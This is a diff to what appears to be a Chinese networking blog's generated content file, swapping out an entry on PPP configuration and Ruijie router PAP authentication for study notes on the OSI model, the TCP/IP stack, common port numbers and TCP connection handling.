@@ -2386,340 +2386,6 @@ tcp 100.1.1.100:23 192.168.1.3:23 100.1.1.1:1026 100.1.1.1:1026</code></pre></li
       </tags>
   </entry>
   <entry>
-    <title>OSI参考模型及TCP/IP协议栈</title>
-    <url>/posts/7e4a66b0/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-
-
-
-<h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><h3 id="OSI参考模型简介"><a href="#OSI参考模型简介" class="headerlink" title="OSI参考模型简介"></a>OSI参考模型简介</h3><ul>
-<li>为什么使用分层结构<ul>
-<li>降低复杂性</li>
-<li>提高设备的兼容性</li>
-<li>提供标准化接口</li>
-<li>促进模块化工作</li>
-<li>简化教学和学习</li>
-<li>易于实现与维护</li>
-</ul>
-</li>
-<li>OSI模型将数据通讯过程分割为7个层次，每个层次都负责各自的 功能，并设计了对应的协议实现这些功能，各个层次之间有标准化 的接口</li>
-</ul>
-<h3 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114859.png" alt="8" loading="lazy"></p>
-<h3 id="OSI参考模型各层次的功能"><a href="#OSI参考模型各层次的功能" class="headerlink" title="OSI参考模型各层次的功能"></a>OSI参考模型各层次的功能</h3><table>
-<thead>
-<tr>
-<th>OSI参考模型层次</th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>应用层</td>
-<td>提供应用程序间通讯</td>
-<td>为网络用户之间的通信提供专用的程序 <br> 为用户提供网络管理、文件传输、事务处理等服务 <br>应用层包含的协议最多，也最复杂</td>
-</tr>
-<tr>
-<td>表示层</td>
-<td>数据表示、加密、解密</td>
-<td>向上对应用层提供服务，向下接收会话层服务 <br>确保应用接收到的数据可读 <br>规范数据格式与结构 <br> 数据压缩和解压、加密和解密</td>
-</tr>
-<tr>
-<td>会话层</td>
-<td>会话建立维护</td>
-<td>会话层不参与具体的传输，它提供包括访问验证和会话管理 <br>在不同的进程间建立管理维持会话，并能使会话获得同步 <br>担负应用进程服务要求，而运输层不能完成的那部分工作</td>
-</tr>
-<tr>
-<td>传输层</td>
-<td>建立主机端到端链接</td>
-<td>处理主机之间的传输问题 <br> 确保数据传输的可靠性 <br>建立、维护和终止虚电路 <br>容错机制和流量控制</td>
-</tr>
-<tr>
-<td>网络层</td>
-<td>寻址和路由</td>
-<td>路由数据包，提供逻辑寻址 <br>基于网络层地址进行不同网络系统间的最优路径选择 <br>网络层为建立网络连接和为上层提供服务</td>
-</tr>
-<tr>
-<td>数据链路层</td>
-<td>介质访问、链路管理</td>
-<td>负责将上层数据封装成固定格式的帧 <br>为了防止数据传输过程中产生误码，在帧尾部加上校验信息 <br>还有流控机制 会试探接收方缓存调整速率大小</td>
-</tr>
-<tr>
-<td>物理层</td>
-<td>二进制传输</td>
-<td>定义了电气、机械、形状针脚等物理特性。 <br> 主要功能是完成相邻节点之间原始比特流的传输，它关心的 是如何用物理信号表示0和1</td>
-</tr>
-</tbody></table>
-<h3 id="报文封装与解封装"><a href="#报文封装与解封装" class="headerlink" title="报文封装与解封装"></a>报文封装与解封装</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114904.png" alt="9" loading="lazy"></p>
-<h3 id="数据在不同网络设备之间转发"><a href="#数据在不同网络设备之间转发" class="headerlink" title="数据在不同网络设备之间转发"></a>数据在不同网络设备之间转发</h3><ul>
-<li><p>发送方对原始数据进行封装，通过介质发送到下一跳设备 </p>
-</li>
-<li><p>中间的网络设备对数据包进行解封装，查看对应信息，根据表项进行转发 </p>
-</li>
-<li><p>数据经过中转达到目的设备，解封装后到达目标应用程序</p>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114906.png" alt="10" loading="lazy"></p>
-<h2 id="TCP-x2F-IP协议栈"><a href="#TCP-x2F-IP协议栈" class="headerlink" title="TCP&#x2F;IP协议栈"></a>TCP&#x2F;IP协议栈</h2><h3 id="与OSI模型的区别"><a href="#与OSI模型的区别" class="headerlink" title="与OSI模型的区别"></a>与OSI模型的区别</h3><ul>
-<li>TCP&#x2F;IP总共定义了4层</li>
-<li>OSI的1、2层合并为网络接入层 </li>
-<li>OSI的5、6、7层合并为网络应用层 </li>
-<li>OSI模型与TCP&#x2F;IP模型都是描述网络设备之间通讯标准流程</li>
-<li>TCP&#x2F;IP模型是Internet的基本协</li>
-</ul>
-<h3 id="TCP-x2F-IP协议桟与OSI参考模型对应关系"><a href="#TCP-x2F-IP协议桟与OSI参考模型对应关系" class="headerlink" title="TCP&#x2F;IP协议桟与OSI参考模型对应关系"></a>TCP&#x2F;IP协议桟与OSI参考模型对应关系</h3><table>
-<thead>
-<tr>
-<th>TCP&#x2F;IP</th>
-<th>OSI</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>应用层</td>
-<td>应用层<br>表示层<br>会话层</td>
-</tr>
-<tr>
-<td>传输层</td>
-<td>传输层</td>
-</tr>
-<tr>
-<td>网络层</td>
-<td>网络层</td>
-</tr>
-<tr>
-<td>网络接入层</td>
-<td>数据链路层 <br> 物理层</td>
-</tr>
-</tbody></table>
-<h3 id="TCP-x2F-IP协议栈各层功能"><a href="#TCP-x2F-IP协议栈各层功能" class="headerlink" title="TCP&#x2F;IP协议栈各层功能"></a>TCP&#x2F;IP协议栈各层功能</h3><h4 id="应用层功能"><a href="#应用层功能" class="headerlink" title="应用层功能"></a>应用层功能</h4><p>为应用提供网络服务</p>
-<ul>
-<li>网络应用<ul>
-<li>微博、微信、QQ……</li>
-</ul>
-</li>
-<li>邮件服务（SMTP、POP3）<ul>
-<li>Outlook、新浪邮箱……</li>
-</ul>
-</li>
-<li>网页服务（http、https）<ul>
-<li>百度、搜狐、网易</li>
-</ul>
-</li>
-<li>网络管理<ul>
-<li>SNMP</li>
-</ul>
-</li>
-<li>远程登陆<ul>
-<li>Telnet、ssh</li>
-</ul>
-</li>
-<li>地址服务<ul>
-<li><pre><code>DNS、DHCP
-</code></pre>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h4><p>提供端到端传输服务</p>
-<ul>
-<li>基于TCP的协议，可靠传输、有重传机制<ul>
-<li>FTP、SMTP、Telnet、HTTP</li>
-</ul>
-</li>
-<li>基于UDP的协议传输，不可靠、效率高<ul>
-<li>TFTP、SNMP、DHCP</li>
-</ul>
-</li>
-</ul>
-<p>TCP&#x2F;UDP端口号范围是<code>0~65535</code>，其中<code>0~1023</code>是熟知端口号，已固定分配给常用应用程序</p>
-<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
-<li><p>提供主机到主机的传输服务</p>
-</li>
-<li><p>IP</p>
-<ul>
-<li>提供主机到主机的传输服务</li>
-</ul>
-</li>
-<li><p>ICMP</p>
-<ul>
-<li>辅助IP工作,提供出错和控制信息</li>
-</ul>
-</li>
-<li><p>ARP</p>
-<ul>
-<li>解析IP与MAC的映射</li>
-</ul>
-</li>
-</ul>
-<h4 id="网络接入层"><a href="#网络接入层" class="headerlink" title="网络接入层"></a>网络接入层</h4><ul>
-<li><p>在相邻节点提供数据传输服务</p>
-</li>
-<li><p>局域网</p>
-<ul>
-<li>IEEE802.2	定义LLC子层</li>
-<li>IEEE802.3 	以太网标准</li>
-</ul>
-</li>
-<li><p>广域网</p>
-<ul>
-<li>HDLC(高级数据链路控)协议)</li>
-<li>PPP(点对点协议,类别:数据链路层协议)</li>
-<li>Frame Relay(帧中继)</li>
-</ul>
-</li>
-</ul>
-<h3 id="常见协议端口号"><a href="#常见协议端口号" class="headerlink" title="常见协议端口号"></a>常见协议端口号</h3><h4 id="TCP端口号"><a href="#TCP端口号" class="headerlink" title="TCP端口号"></a>TCP端口号</h4><table>
-<thead>
-<tr>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>FTP</td>
-<td>21</td>
-<td>HTTP</td>
-<td>80</td>
-<td>SMTP</td>
-<td>25</td>
-</tr>
-<tr>
-<td>FT-daada</td>
-<td>20</td>
-<td>HTTPS</td>
-<td>443</td>
-<td>POP3</td>
-<td>110</td>
-</tr>
-<tr>
-<td>Telnet</td>
-<td>23</td>
-<td>SQL</td>
-<td>１４３３</td>
-<td>Tacacs＋</td>
-<td>４９</td>
-</tr>
-<tr>
-<td>SSH</td>
-<td>２２</td>
-<td>Oracle</td>
-<td>１５２１</td>
-<td>DNS</td>
-<td>５３</td>
-</tr>
-</tbody></table>
-<h4 id="UDP端口号"><a href="#UDP端口号" class="headerlink" title="UDP端口号"></a>UDP端口号</h4><table>
-<thead>
-<tr>
-<th align="center">协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">DHCP</td>
-<td>67、68</td>
-<td>Radius</td>
-<td>1812、1813</td>
-<td>WINS</td>
-<td>42</td>
-</tr>
-<tr>
-<td align="center">TFTP</td>
-<td>69</td>
-<td>NTP</td>
-<td>123</td>
-<td>NETBIOS</td>
-<td>137、138、139</td>
-</tr>
-<tr>
-<td align="center">SNMP</td>
-<td>１６１、１６２</td>
-<td>RIP</td>
-<td>５２０</td>
-<td>DNS</td>
-<td>５３</td>
-</tr>
-</tbody></table>
-<h3 id="传输层的区别"><a href="#传输层的区别" class="headerlink" title="传输层的区别"></a>传输层的区别</h3><ul>
-<li>UDP报文结构简单，传输效率高，但不具备排序功能以及重传机制，数据包到达目的地时，有可能因为网 络问题，出现乱序或者丢包现象<ul>
-<li>常用在视频、语音应用等</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114916.png" alt="1" loading="lazy"></p>
-<ul>
-<li><p>TCP报文结构相对复杂，具备序列号、确认号、窗口大小等字段，使其具备排序功能、重传机制、滑动窗 口机制，确保数据传输的可靠性，使得数据能够准确按序到达目的地 </p>
-<ul>
-<li>常用在HTTP、FTP等可靠传输</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114918.png" alt="2" loading="lazy"></p>
-<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul>
-<li><p>基于TCP协议</p>
-<ul>
-<li>传输数据前:由TCP建立连接</li>
-<li>传输过程中:由TCP解决可靠性、有序性，进行流量控制</li>
-<li>传输结束后：由TCP拆除链接</li>
-</ul>
-</li>
-<li><p>TCP头部字段</p>
-<ul>
-<li>端口号：源端口标识发送方的进程,目的端口表示接收方的进程</li>
-</ul>
-</li>
-<li><p>序列号:保证数据传输的有序性,确认收到的数据进行确认</p>
-<ul>
-<li>窗口大小:传输阶段每次连续发送数据的大小</li>
-</ul>
-</li>
-<li><p>Flag字段:</p>
-<ul>
-<li>ACK:确认标志号,置于1表示确认号有效,表示收到虽短的特定数据<ul>
-<li>RST:复位标志.至于1表示拒绝错误和非法的数据包,复位错误的链接</li>
-</ul>
-</li>
-<li>SYN:同步标志序号,至于1表示同步需要,用来建立连接<ul>
-<li>FIN:结束标志,至于1表示链接将被断开,用于拆除链接</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114921.png" alt="3" loading="lazy"></p>
-<h3 id="TCP协议工作过程"><a href="#TCP协议工作过程" class="headerlink" title="TCP协议工作过程"></a>TCP协议工作过程</h3><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>数据传输之前：三次握手建立连接</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114923.png" alt="4" loading="lazy"></p>
-<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p> 数据传输过程中，发送方发送窗口大小的数据，接收方只进行一次确认</p>
-<p> 如果接收方处理能力不足，会调整窗口大小，接收方按新的窗口进行数据发送</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114925.png" alt="5" loading="lazy"></p>
-<h4 id="重传机制"><a href="#重传机制" class="headerlink" title="重传机制"></a>重传机制</h4><p> 当某个包因网络问题，传输失败，接收方仅确认上一个数据包 </p>
-<p>发送方将根据确认号，进行数据重传</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114927.png" alt="6" loading="lazy"></p>
-<h4 id="拆除连接"><a href="#拆除连接" class="headerlink" title="拆除连接"></a>拆除连接</h4><p>四次挥手拆除连接， TCP通过FIN置位为1表示拆除连接</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114929.png" alt="7" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OSPF基础</title>
     <url>/posts/2400a6ce/</url>
     <content><![CDATA[<div class="danger">
@@ -3218,8 +2884,8 @@ Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>PPP协议原理与配置</title>
-    <url>/posts/cea6a88e/</url>
+    <title>OSI参考模型及TCP/IP协议栈</title>
+    <url>/posts/7e4a66b0/</url>
     <content><![CDATA[<div class="danger">
 
 <blockquote>
@@ -3230,277 +2896,318 @@ Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
 
 
 
-
-
-
-<h2 id="PPP协议简介"><a href="#PPP协议简介" class="headerlink" title="PPP协议简介"></a>PPP协议简介</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
-<li>点对点协议（Point to Point Protocol，PPP）为在点对点连接上传输多协议数据包提供了一个标准方法。</li>
-<li>PPP 最初设计是为两个对等节点之间的 IP 流量传输提供一种封装协议。</li>
+<h2 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h2><h3 id="OSI参考模型简介"><a href="#OSI参考模型简介" class="headerlink" title="OSI参考模型简介"></a>OSI参考模型简介</h3><ul>
+<li>为什么使用分层结构<ul>
+<li>降低复杂性</li>
+<li>提高设备的兼容性</li>
+<li>提供标准化接口</li>
+<li>促进模块化工作</li>
+<li>简化教学和学习</li>
+<li>易于实现与维护</li>
 </ul>
-<h3 id="PPP协议简介-1"><a href="#PPP协议简介-1" class="headerlink" title="PPP协议简介"></a>PPP协议简介</h3><ul>
-<li>广域网中的PPP协议： <ul>
-<li>通常使用在专线的点对点线路中，不需要使用MAC地址（MAC地址是以太网的内容） </li>
-<li>PPP与以太网一样工作在OSI模型的数据链路层，使用PPP协议封装数据</li>
+</li>
+<li>OSI模型将数据通讯过程分割为7个层次，每个层次都负责各自的 功能，并设计了对应的协议实现这些功能，各个层次之间有标准化 的接口</li>
+</ul>
+<h3 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114859.png" alt="8" loading="lazy"></p>
+<h3 id="OSI参考模型各层次的功能"><a href="#OSI参考模型各层次的功能" class="headerlink" title="OSI参考模型各层次的功能"></a>OSI参考模型各层次的功能</h3><table>
+<thead>
+<tr>
+<th>OSI参考模型层次</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>提供应用程序间通讯</td>
+<td>为网络用户之间的通信提供专用的程序 <br> 为用户提供网络管理、文件传输、事务处理等服务 <br>应用层包含的协议最多，也最复杂</td>
+</tr>
+<tr>
+<td>表示层</td>
+<td>数据表示、加密、解密</td>
+<td>向上对应用层提供服务，向下接收会话层服务 <br>确保应用接收到的数据可读 <br>规范数据格式与结构 <br> 数据压缩和解压、加密和解密</td>
+</tr>
+<tr>
+<td>会话层</td>
+<td>会话建立维护</td>
+<td>会话层不参与具体的传输，它提供包括访问验证和会话管理 <br>在不同的进程间建立管理维持会话，并能使会话获得同步 <br>担负应用进程服务要求，而运输层不能完成的那部分工作</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td>建立主机端到端链接</td>
+<td>处理主机之间的传输问题 <br> 确保数据传输的可靠性 <br>建立、维护和终止虚电路 <br>容错机制和流量控制</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>寻址和路由</td>
+<td>路由数据包，提供逻辑寻址 <br>基于网络层地址进行不同网络系统间的最优路径选择 <br>网络层为建立网络连接和为上层提供服务</td>
+</tr>
+<tr>
+<td>数据链路层</td>
+<td>介质访问、链路管理</td>
+<td>负责将上层数据封装成固定格式的帧 <br>为了防止数据传输过程中产生误码，在帧尾部加上校验信息 <br>还有流控机制 会试探接收方缓存调整速率大小</td>
+</tr>
+<tr>
+<td>物理层</td>
+<td>二进制传输</td>
+<td>定义了电气、机械、形状针脚等物理特性。 <br> 主要功能是完成相邻节点之间原始比特流的传输，它关心的 是如何用物理信号表示0和1</td>
+</tr>
+</tbody></table>
+<h3 id="报文封装与解封装"><a href="#报文封装与解封装" class="headerlink" title="报文封装与解封装"></a>报文封装与解封装</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114904.png" alt="9" loading="lazy"></p>
+<h3 id="数据在不同网络设备之间转发"><a href="#数据在不同网络设备之间转发" class="headerlink" title="数据在不同网络设备之间转发"></a>数据在不同网络设备之间转发</h3><ul>
+<li><p>发送方对原始数据进行封装，通过介质发送到下一跳设备 </p>
+</li>
+<li><p>中间的网络设备对数据包进行解封装，查看对应信息，根据表项进行转发 </p>
+</li>
+<li><p>数据经过中转达到目的设备，解封装后到达目标应用程序</p>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114906.png" alt="10" loading="lazy"></p>
+<h2 id="TCP-x2F-IP协议栈"><a href="#TCP-x2F-IP协议栈" class="headerlink" title="TCP&#x2F;IP协议栈"></a>TCP&#x2F;IP协议栈</h2><h3 id="与OSI模型的区别"><a href="#与OSI模型的区别" class="headerlink" title="与OSI模型的区别"></a>与OSI模型的区别</h3><ul>
+<li>TCP&#x2F;IP总共定义了4层</li>
+<li>OSI的1、2层合并为网络接入层 </li>
+<li>OSI的5、6、7层合并为网络应用层 </li>
+<li>OSI模型与TCP&#x2F;IP模型都是描述网络设备之间通讯标准流程</li>
+<li>TCP&#x2F;IP模型是Internet的基本协</li>
+</ul>
+<h3 id="TCP-x2F-IP协议桟与OSI参考模型对应关系"><a href="#TCP-x2F-IP协议桟与OSI参考模型对应关系" class="headerlink" title="TCP&#x2F;IP协议桟与OSI参考模型对应关系"></a>TCP&#x2F;IP协议桟与OSI参考模型对应关系</h3><table>
+<thead>
+<tr>
+<th>TCP&#x2F;IP</th>
+<th>OSI</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>应用层<br>表示层<br>会话层</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td>传输层</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>网络层</td>
+</tr>
+<tr>
+<td>网络接入层</td>
+<td>数据链路层 <br> 物理层</td>
+</tr>
+</tbody></table>
+<h3 id="TCP-x2F-IP协议栈各层功能"><a href="#TCP-x2F-IP协议栈各层功能" class="headerlink" title="TCP&#x2F;IP协议栈各层功能"></a>TCP&#x2F;IP协议栈各层功能</h3><h4 id="应用层功能"><a href="#应用层功能" class="headerlink" title="应用层功能"></a>应用层功能</h4><p>为应用提供网络服务</p>
+<ul>
+<li>网络应用<ul>
+<li>微博、微信、QQ……</li>
+</ul>
+</li>
+<li>邮件服务（SMTP、POP3）<ul>
+<li>Outlook、新浪邮箱……</li>
+</ul>
+</li>
+<li>网页服务（http、https）<ul>
+<li>百度、搜狐、网易</li>
+</ul>
+</li>
+<li>网络管理<ul>
+<li>SNMP</li>
+</ul>
+</li>
+<li>远程登陆<ul>
+<li>Telnet、ssh</li>
+</ul>
+</li>
+<li>地址服务<ul>
+<li><pre><code>DNS、DHCP
+</code></pre>
+</li>
 </ul>
 </li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162312.png" alt="1" loading="lazy"></p>
-<h3 id="PPP协议层次介绍"><a href="#PPP协议层次介绍" class="headerlink" title="PPP协议层次介绍"></a>PPP协议层次介绍</h3><ul>
-<li>PPP协议层介绍：<ul>
-<li>PPP协议包含两个子协议：链路层控制协议LCP、网络层控制协议NCP </li>
-<li>PPP协议的NCP部分上跨到了OSI参考模型的第三层，因此PPP还具有部分网络层的功能</li>
+<h4 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h4><p>提供端到端传输服务</p>
+<ul>
+<li>基于TCP的协议，可靠传输、有重传机制<ul>
+<li>FTP、SMTP、Telnet、HTTP</li>
+</ul>
+</li>
+<li>基于UDP的协议传输，不可靠、效率高<ul>
+<li>TFTP、SNMP、DHCP</li>
 </ul>
 </li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162314.png" alt="2" loading="lazy"></p>
-<h2 id="PPP协议工作原理"><a href="#PPP协议工作原理" class="headerlink" title="PPP协议工作原理"></a>PPP协议工作原理</h2><ul>
-<li>PPP会话建立：<ul>
-<li>LCP链路建立协商阶段</li>
-<li>认证阶段（可选）：PAP和CHAP两种认证方式 </li>
-<li>NCP网络层协议协商阶段</li>
+<p>TCP&#x2F;UDP端口号范围是<code>0~65535</code>，其中<code>0~1023</code>是熟知端口号，已固定分配给常用应用程序</p>
+<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
+<li><p>提供主机到主机的传输服务</p>
+</li>
+<li><p>IP</p>
+<ul>
+<li>提供主机到主机的传输服务</li>
+</ul>
+</li>
+<li><p>ICMP</p>
+<ul>
+<li>辅助IP工作,提供出错和控制信息</li>
+</ul>
+</li>
+<li><p>ARP</p>
+<ul>
+<li>解析IP与MAC的映射</li>
 </ul>
 </li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162319.png" alt="3" loading="lazy"></p>
-<h3 id="PPP会话建立协商过程"><a href="#PPP会话建立协商过程" class="headerlink" title="PPP会话建立协商过程"></a>PPP会话建立协商过程</h3><ul>
-<li>阶段1：LCP协商阶段</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162324.png" alt="4" loading="lazy"></p>
+<h4 id="网络接入层"><a href="#网络接入层" class="headerlink" title="网络接入层"></a>网络接入层</h4><ul>
+<li><p>在相邻节点提供数据传输服务</p>
+</li>
+<li><p>局域网</p>
 <ul>
-<li>阶段2：身份认证阶段（可选）</li>
+<li>IEEE802.2	定义LLC子层</li>
+<li>IEEE802.3 	以太网标准</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162328.png" alt="5" loading="lazy"></p>
+</li>
+<li><p>广域网</p>
 <ul>
-<li>阶段3：IPCP协商阶段</li>
+<li>HDLC(高级数据链路控)协议)</li>
+<li>PPP(点对点协议,类别:数据链路层协议)</li>
+<li>Frame Relay(帧中继)</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162332.png" alt="6" loading="lazy"></p>
-<h3 id="课程小结"><a href="#课程小结" class="headerlink" title="课程小结"></a>课程小结</h3><ul>
-<li>PPP协议通常工作在广域网的点对点链路中，PPP的通信无需MAC地址 </li>
-<li>PPP工作在OSI参考模型中的数据链路层，包含2个子协议，分别是LCP和NCP</li>
-<li>PPP会话建立有三个阶段，分别是LCP协商阶段、身份认证阶段（可选）、NCP协商阶段</li>
+</li>
 </ul>
-<h2 id="PPP协议基础配置"><a href="#PPP协议基础配置" class="headerlink" title="PPP协议基础配置"></a>PPP协议基础配置</h2><h3 id="PPP基础命令"><a href="#PPP基础命令" class="headerlink" title="PPP基础命令"></a>PPP基础命令</h3><ul>
-<li>双方接口封装PPP</li>
+<h3 id="常见协议端口号"><a href="#常见协议端口号" class="headerlink" title="常见协议端口号"></a>常见协议端口号</h3><h4 id="TCP端口号"><a href="#TCP端口号" class="headerlink" title="TCP端口号"></a>TCP端口号</h4><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>FTP</td>
+<td>21</td>
+<td>HTTP</td>
+<td>80</td>
+<td>SMTP</td>
+<td>25</td>
+</tr>
+<tr>
+<td>FT-daada</td>
+<td>20</td>
+<td>HTTPS</td>
+<td>443</td>
+<td>POP3</td>
+<td>110</td>
+</tr>
+<tr>
+<td>Telnet</td>
+<td>23</td>
+<td>SQL</td>
+<td>１４３３</td>
+<td>Tacacs＋</td>
+<td>４９</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>２２</td>
+<td>Oracle</td>
+<td>１５２１</td>
+<td>DNS</td>
+<td>５３</td>
+</tr>
+</tbody></table>
+<h4 id="UDP端口号"><a href="#UDP端口号" class="headerlink" title="UDP端口号"></a>UDP端口号</h4><table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">DHCP</td>
+<td>67、68</td>
+<td>Radius</td>
+<td>1812、1813</td>
+<td>WINS</td>
+<td>42</td>
+</tr>
+<tr>
+<td align="center">TFTP</td>
+<td>69</td>
+<td>NTP</td>
+<td>123</td>
+<td>NETBIOS</td>
+<td>137、138、139</td>
+</tr>
+<tr>
+<td align="center">SNMP</td>
+<td>１６１、１６２</td>
+<td>RIP</td>
+<td>５２０</td>
+<td>DNS</td>
+<td>５３</td>
+</tr>
+</tbody></table>
+<h3 id="传输层的区别"><a href="#传输层的区别" class="headerlink" title="传输层的区别"></a>传输层的区别</h3><ul>
+<li>UDP报文结构简单，传输效率高，但不具备排序功能以及重传机制，数据包到达目的地时，有可能因为网 络问题，出现乱序或者丢包现象<ul>
+<li>常用在视频、语音应用等</li>
 </ul>
-<pre class="language-none"><code class="language-none">Router(config-if)# encapsulation ppp</code></pre>
-
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114916.png" alt="1" loading="lazy"></p>
 <ul>
-<li>认证方配置对端的用户名和密码</li>
-</ul>
-<pre class="language-none"><code class="language-none">Router(config)# username name password password</code></pre>
-
+<li><p>TCP报文结构相对复杂，具备序列号、确认号、窗口大小等字段，使其具备排序功能、重传机制、滑动窗 口机制，确保数据传输的可靠性，使得数据能够准确按序到达目的地 </p>
 <ul>
-<li>认证方配置PPP认证方式（启用PAP或者CHAP认证）</li>
+<li>常用在HTTP、FTP等可靠传输</li>
 </ul>
-<pre class="language-none"><code class="language-none">Router(config-if)# ppp authentication &#123;chap | chap pap | pap chap | pap&#125;</code></pre>
-
-<h3 id="PPP典型配置案例（PAP单向认证）"><a href="#PPP典型配置案例（PAP单向认证）" class="headerlink" title="PPP典型配置案例（PAP单向认证）"></a>PPP典型配置案例（PAP单向认证）</h3><ul>
-<li>ppp authentication pap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
+</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162337.png" alt="7" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114918.png" alt="2" loading="lazy"></p>
+<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul>
+<li><p>基于TCP协议</p>
 <ul>
-<li>PAP认证，接口状态验证</li>
+<li>传输数据前:由TCP建立连接</li>
+<li>传输过程中:由TCP解决可靠性、有序性，进行流量控制</li>
+<li>传输结束后：由TCP拆除链接</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162342.png" alt="8" loading="lazy"></p>
-<h3 id="PPP典型配置案例（PAP双向认证）"><a href="#PPP典型配置案例（PAP双向认证）" class="headerlink" title="PPP典型配置案例（PAP双向认证）"></a>PPP典型配置案例（PAP双向认证）</h3><ul>
-<li>ppp authentication pap命令指定本地为验证方，验证方需要配置被验证方的用户名密码列表。</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220622162347.png" alt="9" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">username ruijie2 password 0 ruijie2
-interface Serial1&#x2F;0
-ip address 1.1.1.1 255.255.255.0
-encapsulation ppp
-ppp authentication pap
-ppp pap sent-username ruijie1 password 0 ruijie1</code></pre>
-
-<pre class="language-none"><code class="language-none">username ruijie1 password 0 ruijie1
-interface Serial2&#x2F;0
-encapsulation ppp
-ppp authentication pap
-ip address 1.1.1.2 255.255.255.0
